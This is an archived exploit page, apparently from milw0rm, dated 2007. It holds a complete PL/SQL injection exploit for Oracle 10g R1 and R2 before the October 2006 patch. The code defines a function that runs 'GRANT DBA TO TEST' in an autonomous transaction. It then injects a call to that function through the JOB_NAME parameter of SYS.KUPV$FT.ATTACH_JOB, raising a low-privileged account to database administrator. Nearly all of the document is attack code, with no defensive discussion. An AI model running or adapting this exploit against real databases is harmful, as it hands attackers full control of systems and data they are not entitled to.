<html><head><title>Oracle 10g SYS.KUPV$FT.ATTACH_JOB PL/SQL Injection Exploit</title></head><pre>/**
* Exploit for Oracle10g R1 and R2 prior to CPU Oct 2006
* Joxean Koret &lt;joxeankoret@yahoo.es&gt;
* Privileges needed:
*
* - EXECUTE_CATALOG_ROLE
* - CREATE PROCEDURE
*
*/
select *
from user_role_privs
;

CREATE OR REPLACE FUNCTION F1
RETURN NUMBER AUTHID CURRENT_USER
IS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
COMMIT;
RETURN(1);
END;
/

DECLARE
USER_NAME VARCHAR2(200);
JOB_NAME VARCHAR2(200);
NEW_JOB BOOLEAN;
v_Return NUMBER;
BEGIN
USER_NAME := 'OWNER';
JOB_NAME := ''' OR ' || USER || '.f1() = 1--';

v_Return := SYS.KUPV$FT.ATTACH_JOB(
USER_NAME =&gt; USER_NAME,
JOB_NAME =&gt; JOB_NAME,
NEW_JOB =&gt; NEW_JOB
);
END;
/

// milw0rm.com [2007-01-23]</pre></html>